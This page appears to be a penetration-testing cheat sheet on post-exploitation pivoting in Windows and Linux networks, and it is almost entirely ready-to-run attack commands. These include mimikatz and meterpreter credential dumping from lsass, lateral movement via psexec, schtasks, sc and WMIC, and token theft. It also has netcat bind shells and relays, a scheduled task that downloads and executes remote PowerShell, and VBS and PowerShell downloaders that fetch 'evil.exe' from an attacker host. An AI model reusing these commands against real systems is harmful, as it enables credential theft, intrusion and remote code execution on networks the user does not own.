---
title: Pivot
category: Post-Exploitation
order: 97
---

> **WINDOWS Remote Commands with Creds or Hash** 

Get Plain Text Passwords and Hashes | <code> mimikatz # privilege::debug <br> mimikatz # inject::process lsass.exe sekurlsa.dll <br> mimikatz # @getLogonPasswords </code>
Get Plain Text Passwords and Hashes | <code> meterpreter>  load kiwi </br> meterpreter > creds_all </code>
Get Hashes | <code> msf > use post/windows/gather/smart_hashdump <br> meterpreter> hashdump  </code>
Phish Creds | <code> msf > use post/windows/gather/phish_windows_credentials </code>
Find Computer to Pivot to | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname <br> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname </code>
Get Defensive Tech | <code> wmic /node:[box] process list </code>
psexec (requires install, creates service on target) | <code> psexec \\[tartgetIP] [-d] [-u user]  [-p password] [command] [-s for system] [-d for disconnected like netcat] </code>
Metasploit  psexec (writes executable, creates a service with system privs, automatically removes service and executable) | <code> msf > use exploit/windows/smb/psexec <br> msf > set PAYLOAD [payload] <br> msf > set RHOST [tartget] <br> msf > set SMBUser [admin_username] <br> msf > set SMBPass [admin_password_or_hash] </code>

at <br> windows 7 and lower <br> all commands at SYSTEM | <code> net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> #if it isnt running <br> sc \\[targetIP] start schedule* <br> at [\\targetIP] [HH:MM] [A|P] [command] <br> at \\[machine] [time] cmd /c ""[command]"" <br> at \\[targetIP} (*check status*)" </code> 
schtasksStart | Time - HH:MM:SSFrequency: MINUTE, HOURLY, DAILY, ONCE, ONSTART, ONLOGON, ONIDLE <br> <code> net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> *sc \\[targetIP] start schedule* <br> schtasks /creat /tn [taskname] /s [targetIP] /u [user] /p [password] /sc [frequency]  /st [starttime] /sd [startdate] /tr [command] <br> schtasks /query /s [targetIP]" </code>
SC - Runs as SYSTEM | <code> sc \\[targetIP] create netcat binpath= ""cmd.exe /k c:\tools\nc.exe -L -p cmd.exe <br> sc \\[targetIP] start netcat </code>
Metasploit schtasks | <code> meterpreter> run schtasksabuse -c "[command1][,command2].." -t [target IP] </code>
WMIC Invoke Porgram Runs as Admin User | <code> wmic /node:[targetIP] /user:[admin_user] /password:[password] process call create [command] </code>
WMIC on Multiple Machines | <code> /node:@[filename] <br> run a command on multiple machines listed in a file </code>

>**Windows without creds**

{% highlight bash %}
> whoami or sets
> net user [username] /domain

#Steal a Token
meterpreter > use incognito
cobalt strike > Explore Processes and Steal Token
incognito > incognito.exe list_tokens -u
incognito > incognito.exe execute -c domain\user "command"

#Find privs of token
net user [username] /domain

#Find Computer to Pivot To
> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname

#Look for defensive technologies
> wmic /node:[box] process list

#An executable or bat file
> net use \\WIN-K5QAGP4CM7V\C$
> copy C:\wamp64\bin\php\payload.exe \\WIN-K5QAGP4CM7V\C$\Users\PUblic\Music\payload.exe
>  wmic /node:"WIN-K5QAGP4CM7V" process call create "C:\Users\PUblic\Music\payload.exe"

#WMIC and Powershell
> wmic /node:"WIN-K5QAGP4CM7V" process call create "powershell.exe -nop -w hidden -encodedcommand [encodedcommand]"

#Scheduled Task and Powershell
> schtasks /create /tn ScoreBoard /s 10.4.0.100 /tr "C:\windows\system32\WindowsPowerShell\V1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.128.0.11:8000/page'''))'" /sc MINUTE /st 12:53
{% endhighlight %}

>**Metasploit and Meterpreter**

{% highlight bash %}
meterpreter> ipconfig 
Broadcom 440x 10/100 Integrated Controller - Packet Scheduler Miniport
Hardware MAC: 00:0b:db:1d:d3:2b
IP Address : 192.168.15.3
Netmask : 255.255.255.0

meterpreter > run arp_scanner -r 192.168.15.1/24
[*] ARP Scanning 192.168.15.1/24
[*] IP: 192.168.15.5 MAC d8:d3:85:ff:ff:ff
[*] IP: 192.168.15.5 MAC d8:d3:85:ff:ff:ff

route add 192.168.15.1 255.255.255.0 1

msf exploit(handler) > use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > set RHOSTS 192.168.15.1
RHOSTS => 192.168.15.1
msf auxiliary(tcp) > set PORTS 1-1024
PORTS => 1-1024

msf auxiliary(tcp) > use auxiliary/server/socks4a
msf auxiliary(socks4a) > show options
msf auxiliary(socks4a) > set SRVHOST 159.203.173.82
SRVHOST => 159.203.173.82
msf auxiliary(socks4a) > run
{% endhighlight %}

* Proxy Chain Configuration:

{% highlight bash %}
vi /etc/proxychains.conf 
#comment out DNS
#Change sock4 to:
socks4 [IP of Attack Machine] [PORT of attach machine]

proxychains nmap -sT -P0 10.0.0.10

{% endhighlight %}

> **Netcat Relay** 

Relay | <code> Mknod backpipe p <br> nc -l -p [allowed_inbound_port] 0<backpipe | nc 127.0.0.1 22 1>backpipe <br> ssh login@[target] -p [allowed_inbound_port] </code>
Remote Netcat (detached) | <code> nc.exe -d -l -p 4444 -e cmd.exe </code>

> **netsh pivot** 

{% highlight bash %}
netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>
{% endhighlight %}
  
> **Downloading Files** 

**Linux** 

TFTP (Kali) | <code> mkdir /tftp && aftpd --daemon --port 69 /tftp </code>
TFTP (victim) | <code> tftp 173.32.52.12 -c get MyFile1.txt </code>
FTP (Kali) | Install Pure FTP (see Install Tools)
FTP (victim) | <code> wget ftp://user:password@192.168.1.2/path/file.ext  </code>



**Windows** 

TFTP (Kali) | <code> mkdir /tftp && aftpd --daemon --port 69 /tftp </code>
TFTP (victim) | <code> tftp -i 192.168.1.3 GET nc.exe </code>
FTP | <code> echo open^ 192.168.1.2^ 21  > ftp.txt && echo USER^ ftpuser >> ftp.txt && echo ftp >> ftp.txt && echo bin >> ftp.txt && echo GET^ file.exe >> ftp.txt && echo bye | ftp -v -n -s:ftp.txt </code>

**Download with VBS**
{% highlight bash %}
note: need to insert escapes (^)
echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
echo  Err.Clear >> wget.vbs
echo  Set http = Nothing >> wget.vbs 
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo  http.Open "GET", strURL, False >> wget.vbs echo  http.Send >> wget.vbs 
echo  varByteArray = http.ResponseBody >> wget.vbs 
echo  Set http = Nothing >> wget.vbs echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
echo  strData = "" >> wget.vbs echo  strBuffer = "" >> wget.vbs 
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo  Next >> wget.vbs 
echo  ts.Close >> wget.vbs

cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
{% endhighlight %}

**Download with Powershell**
{% highlight bash %}
echo $storageDir = $pwd > wget.ps1 
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1 
echo $file = "new-exploit.exe" >>wget.ps1 
echo $webclient.DownloadFile($url,$file) >>wget.ps1 
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive NoProfile -File wget.ps1 
{% endhighlight %}

> **useful resources** 

* [mimikatz](https://github.com/gentilkiwi/mimikatz)
* [powershell mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)
* [incognito](https://labs.mwrinfosecurity.com/tools/incognito/)
* [powershell token](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1)
* [SSH Cheat Sheet](http://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet)
* [Meterpreter Pivot](https://pen-testing.sans.org/blog/2012/04/26/got-meterpreter-pivot)
* [Nessus through Proxy](https://blog.elearnsecurity.com/nessus-and-metasploit-scan-networks-in-pivoting.html)
* [SSH Pivot](http://pwnwiki.io/#!pivoting/linux/index.md)


